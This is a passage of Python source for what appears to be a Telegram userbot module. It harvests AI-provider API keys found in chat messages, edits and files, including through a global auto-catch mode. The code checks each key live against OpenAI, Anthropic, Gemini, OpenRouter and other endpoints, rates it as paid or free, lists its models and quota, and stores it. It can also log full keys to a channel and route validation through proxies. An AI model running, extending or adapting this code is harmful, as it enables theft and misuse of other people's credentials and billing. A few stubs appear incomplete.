        return sorted(models, key=generic_key)

    def _model_names_normalized(self, models) -> list[str]:
        out = []
        for model in models or []:
            if not model:
                continue
            name = str(model).strip().lower()
            if "/" in name:
                name = name.rsplit("/", 1)[-1]
            out.append(name)
        return list(dict.fromkeys(out))

    def _gemini_free_model_markers(self) -> tuple[str, ...]:
        return (
            "gemini-2.5-flash",
            "gemini-2.5-flash-lite",
            "gemini-2.0-flash",
            "gemini-2.0-flash-lite",
            "gemini-1.5-flash",
            "gemini-1.5-flash-8b",
            "gemini-1.5-pro",
            "gemini-2.5-pro",
        )

    def _gemini_paid_only_markers(self) -> tuple[str, ...]:
        return (
            "veo-",
            "lyria-",
            "computer-use",
            "imagen",
            "ultra",
            "pro-preview-customtools",
            "gemini-3.1-pro-preview",
        )

    def _gemini_is_paid_only_model(self, name: str) -> bool:
        low = str(name or "").strip().lower()
        if not low:
            return False
        return any(marker in low for marker in self._gemini_paid_only_markers())

    def _gemini_is_known_free_model(self, name: str) -> bool:
        low = str(name or "").strip().lower()
        if not low.startswith("gemini-"):
            return False
        if self._gemini_is_paid_only_model(low):
            return False
        if any(token in low for token in ("customtools", "embedding", "vision", "robotics")):
            return False
        if any(token in low for token in ("native-audio", "-tts", "audio-thinking", "-live")):
            return False
        return any(
            low == root
            or low.startswith(f"{root}-preview")
            or low.startswith(f"{root}-latest")
            or low.startswith(f"{root}-exp")
            for root in self._gemini_free_model_markers()
        )

    def _gemini_tier_from_models(self, models) -> str | None:
        names = self._model_names_normalized(models)
        if not names:
            return None
        if any(self._gemini_is_paid_only_model(name) for name in names):
            return "paid"
        if any(self._gemini_is_known_free_model(name) for name in names):
            return "free"
        if any("preview" in name or "experimental" in name for name in names):
            return "unknown"
        return "unknown"

    def _openrouter_tier_from_models(self, models) -> str | None:
        names = self._model_names_normalized(models)
        if not names:
            return None
        if any(not name.endswith(":free") for name in names):
            return "paid"
        if all(name.endswith(":free") for name in names):
            return "free"
        return None

    def _openai_tier_from_models(self, models) -> str | None:
        names = self._model_names_normalized(models)
        if not names:
            return None
        if any(name.startswith(("gpt-", "o", "text-embedding-", "omni-")) for name in names):
            return "paid"
        return "unknown"

    def _anthropic_tier_from_models(self, models) -> str | None:
        names = self._model_names_normalized(models)
        if not names:
            return None
        if any(name.startswith("claude") for name in names):
            return "paid"
        return None


    def _log_target(self):
        target = self._settings.get("log_target", {}) or {}
        if not isinstance(target, dict):
            target = {"chat_id": None, "thread_id": None, "topic_title": "Logs"}
            self._settings["log_target"] = target
        target.setdefault("chat_id", None)
        target.setdefault("thread_id", None)
        target.setdefault("topic_title", "Logs")
        return target

    def _chat_to_text(self, chat_id):
        if chat_id is None:
            return "—"
        return f"<code>{chat_id}</code>"

    def _log_target_text(self):
        target = self._log_target()
        chat_id = target.get("chat_id")
        thread = target.get("thread_id")
        topic = target.get("topic_title") or "Logs"
        chat_text = self._chat_to_text(chat_id) if chat_id is not None else "—"
        thread_text = f"<code>{thread}</code>" if thread else "—"
        return f"{chat_text} · {thread_text} · <b>{topic}</b>"

    def _is_forum_chat(self, chat) -> bool:
        if chat is None:
            return False
        for attr in ("is_forum", "forum", "forum_enabled", "has_topics", "has_topics_enabled"):
            val = getattr(chat, attr, None)
            if val:
                return True
        return False

    async def _resolve_entity_best_effort(self, raw: str):
        raw = (raw or "").strip()
        if not raw:
            return None

        
        if raw.lstrip("-").isdigit():
            return int(raw)

        
        if raw.startswith("t.me/"):
            raw = "https://" + raw
        if raw.startswith("http://") or raw.startswith("https://"):
            parsed = urlparse(raw)
            host = (parsed.netloc or "").lower()
            path = parsed.path.strip("/")
            if host.endswith("t.me") or host.endswith("telegram.me"):
                
                if path.startswith("c/"):
                    parts = path.split("/")
                    if len(parts) >= 2 and parts[1].isdigit():
                        return int(f"-100{parts[1]}")
                
                if path and not path.startswith(("joinchat", "+")):
                    raw = "@" + path.split("/")[0]
        elif not raw.startswith("@") and re.fullmatch(r"[A-Za-z0-9_]{5,}", raw):
            raw = "@" + raw

        
        for meth in ("get_entity", "get_chat"):
            fn = getattr(self.client, meth, None)
            if callable(fn):
                try:
                    entity = await fn(raw)
                    if entity is None:
                        continue
                    for attr in ("id", "chat_id"):
                        val = getattr(entity, attr, None)
                        if isinstance(val, int):
                            return val
                    if isinstance(entity, dict):
                        for key in ("id", "chat_id"):
                            val = entity.get(key)
                            if isinstance(val, int):
                                return val
                    if isinstance(entity, int):
                        return entity
                except Exception:
                    pass

        
        if "joinchat" in raw or "/+" in raw or raw.startswith("https://t.me/+"):
            for meth in ("join_chat", "import_chat_invite_link", "joinChatByInviteLink", "joinChannelByInviteLink"):
                fn = getattr(self.client, meth, None)
                if callable(fn):
                    try:
                        entity = await fn(raw)
                        if entity is None:
                            continue
                        for attr in ("id", "chat_id"):
                            val = getattr(entity, attr, None)
                            if isinstance(val, int):
                                return val
                        if isinstance(entity, int):
                            return entity
                    except Exception:
                        pass

        return raw

    async def _create_forum_topic(self, chat_ref, title: str):
        title = (title or "Logs").strip()[:128] or "Logs"
        if chat_ref is None:
            return None

        try:
            entity = await self.client.get_entity(chat_ref)
        except Exception:
            return None

        if not isinstance(entity, Channel):
            return None

        forums_cache = self._forums_cache()
        entity_key = getattr(entity, "title", str(chat_ref))
        cached_topic_id = forums_cache.get(entity_key, {}).get(title)
        topic = None

        if cached_topic_id:
            try:
                topic_result = await self.client(
                    GetForumTopicsByIDRequest(peer=entity, topics=[cached_topic_id])
                )
                topic = topic_result.topics[0]
                if isinstance(topic, ForumTopicDeleted):
                    topic = None
                    forums_cache.get(entity_key, {}).pop(title, None)
            except Exception:
                topic = None
                forums_cache.get(entity_key, {}).pop(title, None)

        if topic is None:
            try:
                result = await self.client(
                    GetForumTopicsRequest(
                        peer=entity,
                        offset_date=None,
                        offset_id=0,
                        offset_topic=0,
                        limit=100,
                    )
                )
                for found_topic in result.topics:
                    if getattr(found_topic, "title", None) == title:
                        topic = found_topic
                        break
            except Exception:
                pass

        if topic is None:
            try:
                icon_emoji_id = KEY_TOPIC_EMOJI_ID if self._settings.get("premium_emoji", True) else None
                try:
                    create_result = await self.client(
                        CreateForumTopicRequest(
                            peer=entity,
                            title=title,
                            icon_emoji_id=icon_emoji_id,
                        )
                    )
                except Exception:
                    if not icon_emoji_id:
                        raise
                    create_result = await self.client(
                        CreateForumTopicRequest(
                            peer=entity,
                            title=title,
                        )
                    )
                thread_id = create_result.updates[0].id

                intro_text = self.strings.get(
                    "heroku_topic_intro",
                    
                )
                intro_msg = await self.client.send_message(
                    entity=entity,
                    message=intro_text,
                    reply_to=thread_id,
                    parse_mode="html",
                )
                try:
                    await self.client.pin_message(entity, intro_msg, notify=False)
                except Exception:
                    try:
                        await self.client.pin_message(entity, getattr(intro_msg, "id", intro_msg), notify=False)
                    except Exception:
                        pass

                forums_cache.setdefault(entity_key, {})[title] = thread_id
                topic_result = await self.client(
                    GetForumTopicsByIDRequest(peer=entity, topics=[thread_id])
                )
                topic = topic_result.topics[0]
            except Exception:
                return None
        else:
            forums_cache.setdefault(entity_key, {})[title] = getattr(topic, "id", cached_topic_id)
            
            if (
                self._settings.get("premium_emoji", True)
                and getattr(topic, "icon_emoji_id", None) != KEY_TOPIC_EMOJI_ID
            ):
                try:
                    await self.client(
                        EditForumTopicRequest(
                            channel=entity,
                            topic_id=getattr(topic, "id", cached_topic_id),
                            icon_emoji_id=KEY_TOPIC_EMOJI_ID,
                        )
                    )
                except Exception:
                    pass

        return topic

    def _topic_thread_id_from_result(self, result):
        if result is None:
            return None
        for attr in ("id", "message_thread_id", "thread_id"):
            val = getattr(result, attr, None)
            if isinstance(val, int):
                return val
        if isinstance(result, dict):
            for key in ("id", "message_thread_id", "thread_id"):
                val = result.get(key)
                if isinstance(val, int):
                    return val
        return None

    def _heroku_forums_chat(self):
        try:
            val = self._db.get("heroku.forums", "channel_id", None)
            if val:
                val = int(val)

                if val > 0:
                    val = int(f"-100{val}")
                return val
        except Exception:
            pass
        return None


    def _forums_cache(self):
        try:
            cache = self._db.pointer("heroku.forums", "forums_cache", {})
            if isinstance(cache, dict):
                return cache
        except Exception:
            pass
        try:
            cache = self._db.get("heroku.forums", "forums_cache", {})
            if isinstance(cache, dict):
                return cache
        except Exception:
            pass
        return {}

    async def _send_heroku_intro_from_bot(self, chat_ref, thread_id):
        if not chat_ref or not thread_id:
            return
        sent_key = f"heroku_intro_bot_sent:{chat_ref}:{thread_id}"
        if self.get(sent_key, False):
            return
        bot = getattr(getattr(self, "inline", None), "bot", None)
        if not bot:
            return
        try:
            
            self.set(sent_key, True)
        except Exception:
            pass

    async def _ensure_heroku_log_destination(self, create_if_missing: bool = True):
        try:
            chat_ref, thread_id = await self._bootstrap_heroku_logs()
            if chat_ref is None:
                asset_channel = self._db.get("heroku.forums", "channel_id", 0)
                if not asset_channel:
                    return None, None
                return int(f"-100{asset_channel}"), None
            return chat_ref, thread_id
        except Exception:
            asset_channel = self._db.get("heroku.forums", "channel_id", 0)
            if asset_channel:
                return int(f"-100{asset_channel}"), None
            return None, None

    async def _ensure_log_destination(self, create_if_missing: bool = True):
        """
        Resolves log destination for custom mode.
        Uses _create_forum_topic which handles find-or-create with stale cache
        cleanup. thread_id is persisted in _log_target() after first resolve.
        """
        target = self._log_target()
        chat_ref = target.get("chat_id")
        if chat_ref is None:
            return None, None

        topic_title = target.get("topic_title") or "Logs"
        topic = await self._create_forum_topic(chat_ref, topic_title)
        if not topic:
            return chat_ref, None

        thread_id = self._topic_thread_id_from_result(topic)
        if thread_id and thread_id != target.get("thread_id"):
            target["thread_id"] = thread_id
            self._save()
        return chat_ref, thread_id

    async def _send_log_text(self, text: str):
        mode = self._settings.get("log_mode", "none")
        if mode == "none":
            return

        if mode == "saved":
            try:
                await self.client.send_message("me", self._ui_text(text), parse_mode="html")
            except Exception:
                pass
            return

        if mode == "heroku":
            target = self._log_target()
            chat_ref = target.get("chat_id")
            thread_id = target.get("thread_id")

            if not chat_ref or not thread_id:
                try:
                    chat_ref, thread_id = await self._bootstrap_heroku_logs()
                except Exception:
                    return
                if thread_id:
                    target = self._log_target()
                    target["chat_id"] = chat_ref
                    target["thread_id"] = thread_id
                    self._save()

            if not chat_ref or not thread_id:
                return
            try:
                await self.inline.bot.send_message(
                    chat_ref,
                    self._ui_text(text),
                    parse_mode="HTML",
                    message_thread_id=thread_id,
                )
            except Exception:
                pass
            return

        if mode == "custom":
            chat_ref, thread_id = await self._ensure_log_destination()
            if chat_ref is None:
                return
            if not thread_id:
                try:
                    chat_obj = await self.client.get_entity(chat_ref)
                    if self._is_forum_chat(chat_obj):
                        return
                except Exception:
                    return
            kwargs = {"parse_mode": "html"}
            if thread_id:
                kwargs["reply_to"] = thread_id
            try:
                await self.client.send_message(chat_ref, self._ui_text(text), **kwargs)
            except Exception:
                pass
            return


    def _provider_model_base(self, provider: str):
        mapping = {
            "OpenAI": ("https://api.openai.com/v1", "Bearer"),
            "DeepSeek": ("https://api.deepseek.com", "Bearer"),
            "Perplexity": ("https://api.perplexity.ai", "Bearer"),
            "Mistral": ("https://api.mistral.ai/v1", "Bearer"),
            "Together": ("https://api.together.xyz/v1", "Bearer"),
            "XAI": ("https://api.x.ai/v1", "Bearer"),
            "Fireworks": ("https://api.fireworks.ai/inference/v1", "Bearer"),
            "Novita": ("https://api.novita.ai/v3", "Bearer"),
            "SiliconFlow": ("https://api.siliconflow.cn/v1", "Bearer"),
            "DeepInfra": ("https://api.deepinfra.com/v1/openai", "Bearer"),
            "ZhipuAI": ("https://open.bigmodel.cn/api/paas/v4", "Bearer"),
            "Groq": ("https://api.groq.com/openai/v1", "Bearer"),
            "OpenRouter": ("https://openrouter.ai/api/v1", "Bearer"),
            "Anthropic": ("https://api.anthropic.com/v1", "x-api-key"),
            "Cohere": ("https://api.cohere.com/v1", "Bearer"),
            "Cerebras": ("https://api.cerebras.ai/v1", "Bearer"),
            "Voyage": ("https://api.voyageai.com/v1", "Bearer"),
        }
        return mapping.get(provider)

    async def _discover_models(self, session, key: str, provider: str):
        try:
            if provider == "Gemini":
                url = f"https://generativelanguage.googleapis.com/v1beta/models?key={key}"
                async with session.get(url, timeout=6) as r:
                    if r.status != 200:
                        return []
                    data = await r.json()
                    items = data.get("models") or data.get("data") or []
                    out = []
                    for item in items:
                        name = item.get("name") or item.get("model") or item.get("id")
                        if not name:
                            continue
                        out.append(name.rsplit("/", 1)[-1])
                    return out

            if provider == "Anthropic":
                headers = {"x-api-key": key, "anthropic-version": "2023-06-01"}
                async with session.get("https://api.anthropic.com/v1/models", headers=headers, timeout=6) as r:
                    if r.status != 200:
                        return []
                    data = await r.json()
                    items = data.get("data") or []
                    return [i.get("id") for i in items if i.get("id")]

            if provider == "OpenRouter":
                headers = {"Authorization": f"Bearer {key}"}
                async with session.get("https://openrouter.ai/api/v1/models", headers=headers, timeout=6) as r:
                    if r.status != 200:
                        return []
                    data = await r.json()
                    items = data.get("data") or []
                    return [i.get("id") for i in items if i.get("id")]

            if provider == "Cohere":
                clean_key = key.split("=", 1)[1] if key.startswith("AUTH_TOKEN=") and "=" in key else key
                headers = {"Authorization": f"Bearer {clean_key}"}
                for url in ("https://api.cohere.com/v2/models", "https://api.cohere.com/v1/models"):
                    async with session.get(url, headers=headers, timeout=6) as r:
                        if r.status != 200:
                            continue
                        data = await r.json()
                        items = data.get("models") or data.get("data") or []
                        out = []
                        for item in items:
                            if isinstance(item, str):
                                out.append(item)
                                continue
                            name = item.get("id") or item.get("name") or item.get("model")
                            if name:
                                out.append(name)
                        if out:
                            return out

            base = self._provider_model_base(provider)
            if base:
                base_url, auth_type = base
                headers = {"Authorization": f"Bearer {key}"} if auth_type == "Bearer" else {"x-api-key": key}
                try:
                    async with session.get(f"{base_url}/models", headers=headers, timeout=6) as r:
                        if r.status == 200:
                            data = await r.json()
                            items = data.get("data") or data.get("models") or []
                            out = []
                            for item in items:
                                if isinstance(item, str):
                                    out.append(item)
                                    continue
                                name = item.get("id") or item.get("name") or item.get("model")
                                if name:
                                    out.append(name)
                            if out:
                                return out
                except Exception:
                    pass
                fallback_map = {
                    "DeepSeek": ["deepseek-v4-flash", "deepseek-v4-pro"],
                    "OpenAI": ["gpt-4.1-nano", "gpt-4o-mini", "gpt-4o", "gpt-4.1-mini"],
                    "Groq": ["llama-3.1-8b-instant", "llama-3.3-70b-versatile", "mixtral-8x7b-32768"],
                    "Cerebras": ["llama3.1-8b", "llama-3.3-70b"],
                    "Perplexity": ["sonar", "sonar-pro"],
                    "Together": ["meta-llama/Llama-3.3-70B-Instruct-Turbo"],
                    "Fireworks": ["accounts/fireworks/models/llama-v3p1-8b-instruct"],
                    "XAI": ["grok-2-latest", "grok-3-mini-latest"],
                    "Mistral": ["mistral-small-latest", "mistral-large-latest", "open-mistral-nemo"],
                    "Novita": ["meta-llama/llama-3.1-8b-instruct"],
                    "SiliconFlow": ["Qwen/Qwen2.5-7B-Instruct"],
                    "DeepInfra": ["meta-llama/Meta-Llama-3.1-8B-Instruct"],
                    "ZhipuAI": ["glm-4-flash", "glm-4-air"],
                }
                return fallback_map.get(provider, [])
        except Exception:
            pass
        return []

    def _tier_from_models(self, provider: str, models):
        models = [m for m in (models or []) if m]
        if provider == "Gemini":
            return self._gemini_tier_from_models(models) or "unknown"
        if provider == "OpenRouter":
            return self._openrouter_tier_from_models(models)
        if provider == "OpenAI":
            return self._openai_tier_from_models(models)
        if provider == "Anthropic":
            return self._anthropic_tier_from_models(models)
        return None

    async def _validate_key_bundle(self, session, key: str):
        async with self._validation_semaphore:
            provider, ok = await self._validate_key(session, key)
            result = {
                "key": key,
                "provider": provider,
                "ok": ok,
                "models": [],
                "tier": "unknown",
                "quota": None,
            }
            if not ok:
                result["quota"] = {
                    "kind": "error",
                    "provider": provider,
                    "checked_at": self._now_ts(),
                    "message": "real request failed",
                }
                return result

            models = await self._discover_models(session, key, provider)
            if models:
                models = self._sort_models(provider, models)
            tier = await self._check_paid(session, key, provider, models=models)
            if tier in (None, "unknown"):
                tier = self._tier_from_models(provider, models) or "unknown"

            result["models"] = models or []
            result["tier"] = self._normalize_tier(tier)
            result["quota"] = await self._fetch_key_quota(session, key, provider)
            return result

    def _apply_validated_key_bundle(self, bundle: dict):
        key = bundle["key"]
        provider = bundle["provider"]
        ok = bool(bundle["ok"])
        meta = self._key_meta.setdefault(key, {})
        meta["valid"] = ok
        meta["validated_at"] = self._now_ts()
        meta["provider"] = provider

        if ok:
            self._keys[key] = provider
            models = bundle.get("models") or []
            if models:
                self._ensure_model_cache()[key] = models
            else:
                self._ensure_model_cache().pop(key, None)
            tier = self._normalize_tier(bundle.get("tier"))
            self._paid_status[key] = tier
            self._record_key_meta(key, provider, models=models, tier=tier)
            meta["quota"] = bundle.get("quota")
            meta["tier"] = tier
            meta["models_count"] = len(models)
            return True

        self._paid_status[key] = "unknown"
        self._ensure_model_cache().pop(key, None)
        meta["quota"] = bundle.get("quota")
        meta["tier"] = "unknown"
        meta["models_count"] = 0
        return False

    async def _register_key(
        self,
        session,
        key: str,
        provider: str,
        source_chat_id,
        via: str = "message",
        safe_mode: bool = False,
        source_message_id: int | None = None,
        source_chat_username: str | None = None,
        message_link_chat_id=None,
    ):
        models = await self._discover_models(session, key, provider)
        tier = self._tier_from_models(provider, models) or "unknown"
        if not safe_mode and tier == "unknown":
            checked_tier = await self._check_paid(session, key, provider, models=models)
            if checked_tier not in (None, "unknown"):
                tier = checked_tier
        tier = self._normalize_tier(tier)
        quota = await self._fetch_key_quota(session, key, provider)
        self._keys[key] = provider
        self._paid_status[key] = tier
        if models:
            self._ensure_model_cache()[key] = models
        else:
            self._ensure_model_cache().pop(key, None)
        self._record_key_meta(key, provider, source_chat_id, via=via, models=models, tier=tier)
        meta = self._key_meta.setdefault(key, {})
        meta["quota"] = quota
        meta["valid"] = True
        meta["validated_at"] = self._now_ts()
        await self._handle_new_key(
            key,
            provider,
            source_chat_id,
            via=via,
            source_message_id=source_message_id,
            source_chat_username=source_chat_username,
            message_link_chat_id=message_link_chat_id,
        )

    async def _handle_new_key(
        self,
        key: str,
        provider: str,
        source_chat_id,
        via: str = "message",
        source_message_id: int | None = None,
        source_chat_username: str | None = None,
        message_link_chat_id=None,
    ):
        mode = self._settings.get("log_mode", "none")
        if mode == "none" or not self._settings.get("notify_new_keys", True):
            return
        link_cid = message_link_chat_id if message_link_chat_id is not None else source_chat_id
        message_row = self._new_key_message_row_html(link_cid, source_message_id, source_chat_username)
        text = self.strings["new_key_notif"].format(
            provider=provider,
            key=key if self._settings.get("log_full_keys", False) else self._mask_key(key, True),
            chat_id=source_chat_id,
            via=via,
            message_row=message_row,
        )
        await self._send_log_text(text)

    async def _gather_chunked(self, tasks, chunk_size: int = 24):
        res = []
        for i in range(0, len(tasks), chunk_size):
            res.extend(await asyncio.gather(*tasks[i:i + chunk_size]))
            await asyncio.sleep(0.05)
        return res

    async def _process_text(
        self,
        text: str,
        chat_id,
        via: str = "message",
        message_id: int | None = None,
        chat_username: str | None = None,
    ) -> int:
        """Extract, validate and store new keys from arbitrary text. Returns new-key count."""
        if not self._text_might_contain_key(text):
            return 0
        matches  = self.key_regex.findall(text)
        new_keys = [k for k in set(matches) if k not in self._keys]
        if not new_keys:
            return 0
        count = 0
        async with self._scan_semaphore:
            safe_mode = bool(self._settings.get("safe_auto_checks", True))
            async with self._http_session() as session:
                tasks   = [self._validate_key(session, k, allow_spend=not safe_mode) for k in new_keys]
                results = await self._gather_chunked(tasks)
                for key, (provider, is_valid) in zip(new_keys, results):
                    if is_valid:
                        count += 1
                        await self._register_key(
                            session,
                            key,
                            provider,
                            chat_id,
                            via=via,
                            safe_mode=safe_mode,
                            source_message_id=message_id,
                            source_chat_username=chat_username,
                        )
        if count:
            self._save()
        return count

    async def _validate_key(self, session, key: str, allow_spend: bool = True):
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        openai_like = {
            "OpenRouter": {
                "base_url": "https://openrouter.ai/api/v1",
                "fallback_models": ["openai/gpt-4o-mini", "openai/gpt-4.1-nano", "anthropic/claude-3.5-haiku"],
                "headers": None,
            },
            "Groq": {
                "base_url": "https://api.groq.com/openai/v1",
                "fallback_models": ["llama-3.1-8b-instant", "llama-3.3-70b-versatile", "mixtral-8x7b-32768"],
                "headers": None,
            },
            "Cerebras": {
                "base_url": "https://api.cerebras.ai/v1",
                "fallback_models": ["llama3.1-8b", "llama-3.3-70b"],
                "headers": None,
            },
            "Perplexity": {
                "base_url": "https://api.perplexity.ai",
                "fallback_models": ["sonar", "sonar-pro"],
                "headers": None,
            },
            "Together": {
                "base_url": "https://api.together.xyz/v1",
                "fallback_models": ["meta-llama/Llama-3.3-70B-Instruct-Turbo", "meta-llama/Meta-Llama-3.1-8B-Instruct-Turbo"],
                "headers": None,
            },
            "Fireworks": {
                "base_url": "https://api.fireworks.ai/inference/v1",
                "fallback_models": ["accounts/fireworks/models/llama-v3p1-8b-instruct", "accounts/fireworks/models/qwen3-8b"],
                "headers": None,
            },
            "XAI": {
                "base_url": "https://api.x.ai/v1",
                "fallback_models": ["grok-2-latest", "grok-3-mini-latest"],
                "headers": None,
            },
            "DeepSeek": {
                "base_url": "https://api.deepseek.com",
                "fallback_models": ["deepseek-v4-flash", "deepseek-v4-pro"],
                "headers": None,
            },
            "Mistral": {
                "base_url": "https://api.mistral.ai/v1",
                "fallback_models": ["mistral-small-latest", "mistral-large-latest", "open-mistral-nemo"],
                "headers": None,
            },
            "Novita": {
                "base_url": "https://api.novita.ai/v3/openai",
                "fallback_models": ["meta-llama/llama-3.1-8b-instruct", "deepseek/deepseek-v3-turbo"],
                "headers": None,
            },
            "SiliconFlow": {
                "base_url": "https://api.siliconflow.cn/v1",
                "fallback_models": ["Qwen/Qwen2.5-7B-Instruct", "deepseek-ai/DeepSeek-V3"],
                "headers": None,
            },
            "DeepInfra": {
                "base_url": "https://api.deepinfra.com/v1/openai",
                "fallback_models": ["meta-llama/Meta-Llama-3.1-8B-Instruct", "Qwen/Qwen2.5-7B-Instruct"],
                "headers": None,
            },
            "ZhipuAI": {
                "base_url": "https://open.bigmodel.cn/api/paas/v4",
                "fallback_models": ["glm-4-flash", "glm-4-air"],
                "headers": None,
            },
            "OpenAI": {
                "base_url": "https://api.openai.com/v1",
                "fallback_models": ["gpt-4.1-nano", "gpt-4o-mini", "gpt-4o", "gpt-4.1-mini", "gpt-4-turbo"],
                "headers": None,
            },
        }

        try:
            if key.startswith("sk-or-v1-"):
                ok, _ = await self._probe_openai_compatible_response(session, "OpenRouter", key, **openai_like["OpenRouter"])
                return "OpenRouter", ok

            elif key.startswith("gsk_"):
                ok, _ = await self._probe_openai_compatible_response(session, "Groq", key, **openai_like["Groq"])
                return "Groq", ok

            elif key.startswith("AIza"):
                ok, _ = await self._probe_gemini_response(session, key)
                return "Gemini", ok

            elif key.startswith("sk-ant-"):
                ok, _, err = await self._anthropic_messages_probe(session, key)
                if "credit balance is too low" in (err or "").lower():
                    return "Anthropic", False
                return "Anthropic", ok

            elif key.startswith("hf_"):
                async with session.get(
                    "https://huggingface.co/api/whoami-v2",
                    headers={"Authorization": f"Bearer {key}"},
                    timeout=6,
                ) as r:
                    return "HuggingFace", r.status == 200

            elif key.startswith("r8_"):
                async with session.get(
                    "https://api.replicate.com/v1/account",
                    headers={"Authorization": f"Bearer {key}"},
                    timeout=6,
                ) as r:
                    return "Replicate", r.status == 200

            elif key.startswith(("co-", "TKN-", "AUTH_TOKEN=")):
                ok, _ = await self._probe_cohere_response(session, key)
                return "Cohere", ok

            elif key.startswith(("voyage-", "vp-")):
                ok, _ = await self._probe_voyage_response(session, key)
                return "Voyage", ok

            elif key.startswith("csk_"):
                ok, _ = await self._probe_openai_compatible_response(session, "Cerebras", key, **openai_like["Cerebras"])
                return "Cerebras", ok

            elif key.startswith("pplx-"):
                ok, _ = await self._probe_openai_compatible_response(session, "Perplexity", key, **openai_like["Perplexity"])
                return "Perplexity", ok

            elif key.startswith("together_"):
                ok, _ = await self._probe_openai_compatible_response(session, "Together", key, **openai_like["Together"])
                return "Together", ok

            elif key.startswith("fw_"):
                ok, _ = await self._probe_openai_compatible_response(session, "Fireworks", key, **openai_like["Fireworks"])
                return "Fireworks", ok

            elif key.startswith("xai-"):
                ok, _ = await self._probe_openai_compatible_response(session, "XAI", key, **openai_like["XAI"])
                return "XAI", ok

            if key.startswith("sk-"):
                for provider in ("OpenAI", "DeepSeek", "Perplexity", "Mistral", "Together", "XAI", "Fireworks", "Novita", "SiliconFlow", "DeepInfra", "ZhipuAI"):
                    ok, _ = await self._probe_openai_compatible_response(session, provider, key, **openai_like[provider])
                    if ok:
                        return provider, True
                return "Unknown", False

        except Exception:
            pass
        return "Unknown", False


    async def _gemini_paid_check(self, session, key: str) -> str:
        """
        Gemini has no single balance endpoint. We infer paid tier from the
        accessible model catalog: explicit paid-only models mean paid, known
        free text families mean free, and everything else stays unknown.
        """
        try:
            async with session.get(
                "https://generativelanguage.googleapis.com/v1beta/models",
                params={"key": key, "pageSize": 1000},
                timeout=6,
            ) as r:
                if r.status != 200:
                    return "unknown"
                data = await r.json()
        except Exception:
            return "unknown"

        models = []
        for item in data.get("models", []) or []:
            name = (item.get("name") or "").removeprefix("models/")
            base = item.get("baseModelId") or ""
            models.append(name)
            models.append(base)
        names = self._model_names_normalized(models)
        if any(self._gemini_is_paid_only_model(name) for name in names):
            return "paid"
        if any(self._gemini_is_known_free_model(name) for name in names):
            return "free"
        return "unknown"

    async def _check_paid(self, session, key: str, provider: str, models=None) -> str:
        """Returns 'paid', 'free', or 'unknown'."""
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        models = models or []
        try:
            if provider == "Gemini" or key.startswith("AIza"):
                return self._gemini_tier_from_models(models) or await self._gemini_paid_check(session, key)

            if provider == "DeepSeek":
                return "paid"

            if provider == "Anthropic" or key.startswith("sk-ant-"):
                tier = self._anthropic_tier_from_models(models)
                return tier or "unknown"

            if provider == "OpenRouter" or key.startswith("sk-or-v1-"):
                tier = self._openrouter_tier_from_models(models)
                async with session.get("https://openrouter.ai/api/v1/key",
                                       headers=headers, timeout=5) as r:
                    if r.status == 200:
                        d       = await r.json()
                        info = d.get("data", {})
                        is_free = info.get("is_free_tier")
                        if is_free is True:
                            return tier or "free"
                        if is_free is False:
                            return "paid"
                        return tier or "unknown"

            if provider == "OpenAI" or (key.startswith("sk-") and not key.startswith(("sk-or-v1-", "sk-ant-"))):
                tier = self._openai_tier_from_models(models)
                if tier:
                    return tier
                async with session.get("https://api.openai.com/v1/models", headers=headers, timeout=5) as r:
                    if r.status == 200:
                        d = await r.json()
                        return self._openai_tier_from_models([item.get("id") for item in d.get("data", [])]) or "unknown"
                    return "unknown"

            elif provider in ("Gemini",) or key.startswith("AIza"):
                return "unknown"

            elif provider == "HuggingFace" or key.startswith("hf_"):
                async with session.get("https://huggingface.co/api/whoami-v2", headers=headers, timeout=5) as r:
                    if r.status == 200:
                        d = await r.json()
                        return "paid" if self._hf_has_zerogpu(d) or d.get("isPro") else "free"
                return "unknown"

            elif provider == "Groq" or key.startswith("gsk_"):
                return "free"

            elif provider == "Cohere":
                return "unknown"

            elif provider == "Voyage":
                return "unknown"

            elif provider == "Cerebras":
                return "free"

            elif provider == "Replicate":
                return "unknown"

            elif provider in {"Perplexity", "Together", "Fireworks"}:
                return "unknown"

            elif provider == "XAI":
                return "paid" if models else "unknown"

        except Exception:
            pass
        return "unknown"

    







    strings.update({
        "found": f"{E_OK} <b>Scan complete!</b>\n{E_FIRE} Valid keys found: <b>{{valid_count}}</b>\n{E_LIST} Raw keys matched: <b>{{raw_count}}</b>\n{E_MSG} Messages scanned/read: <b>{{scanned_count}}</b>\n{E_BATT} Saved to database.",
        "settings_capture_title": (
            f"{E_BELL} <b>Capture Settings</b>\n\n"
            f"Chat auto-catch: <b>{{auto_chat}}</b>\n"
            f"Global auto-catch: <b>{{auto_global}}</b>\n"
            f"File scan: <b>{{file_scan}}</b>\n"
            f"Edit scan: <b>{{edit_scan}}</b>\n"
            f"New key notifications: <b>{{notify_new_keys}}</b>\n"
            f"Safe checks: <b>{{safe_auto}}</b>\n"
            f"Full key in logs: <b>{{log_full_keys}}</b>"
        ),
        "btn_toggle_safe_checks": "🛡 Safe Checks",
        "btn_toggle_log_full_keys": "🔐 Full Log Keys",
        "proxy_help": (
            f"{E_LINK} <b>Validation proxy:</b> {{proxy}}\n"
            f"{E_GEAR} One proxy per line. Best alive runtime proxy is selected automatically.\n"
            f"{E_LIST} Supported: HTTP, SOCKS4/4A/5/5H, VLESS, TROJAN, SHADOWSOCKS, OUTLINE."
        ),
        "proxy_invalid": f"{E_ERR} <b>Proxy was not saved.</b>\n{{error}}",
        "proxy_disabled": f"{E_LINK} <b>Validation proxy disabled.</b>",
        "proxy_set": f"{E_OK} <b>Validation proxy saved:</b> <code>{{proxy}}</code>",
    })

    strings_ru.update({
        "btn_toggle_preview":    "🖼 Превью карточки",
        "found": f"{E_OK} <b>Сканирование завершено!</b>\n{E_FIRE} Валидных ключей найдено: <b>{{valid_count}}</b>\n{E_LIST} Сырых совпадений: <b>{{raw_count}}</b>\n{E_MSG} Сообщений/вложений просмотрено: <b>{{scanned_count}}</b>\n{E_BATT} Сохранено в базу.",
        "settings_capture_title": (
            f"{E_BELL} <b>Настройки ловли</b>\n\n"
            f"Авто-ловля в чате: <b>{{auto_chat}}</b>\n"
            f"Глобальная авто-ловля: <b>{{auto_global}}</b>\n"
            f"Скан файлов: <b>{{file_scan}}</b>\n"
            f"Скан правок: <b>{{edit_scan}}</b>\n"
            f"Уведомления о новых ключах: <b>{{notify_new_keys}}</b>\n"
            f"Безопасные проверки: <b>{{safe_auto}}</b>\n"
